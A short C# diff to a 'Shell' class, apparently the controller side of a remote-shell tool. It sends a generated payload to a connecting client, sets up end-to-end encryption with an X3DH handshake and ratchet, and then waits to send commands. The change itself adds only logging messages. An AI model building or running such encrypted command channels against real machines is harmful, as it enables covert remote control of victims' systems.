@@ -13,12 +13,17 @@ public class Shell
     {
         var socketServer = new SocketServer(serverIpAddress, serverPort);
 
-        var payload = GeneratePayload(payloadDirectory);
+        Console.WriteLine($"Received connection from {socketServer.ClientIpAddress}:{socketServer.ClientPort}!");
+        Console.WriteLine($"Sending payload to {socketServer.ClientIpAddress}:{socketServer.ClientPort} ...");
 
+        var payload = GeneratePayload(payloadDirectory);
         socketServer.SendData(payload, false);
 
         socketServer.PerformX3dhHandshake();
         socketServer.InitializeRatchet();
+
+        Console.WriteLine(
+            "Client successfully initialized, and the connection is now end to end encrypted! You can now start sending commands.");
 
         while (true)
         {
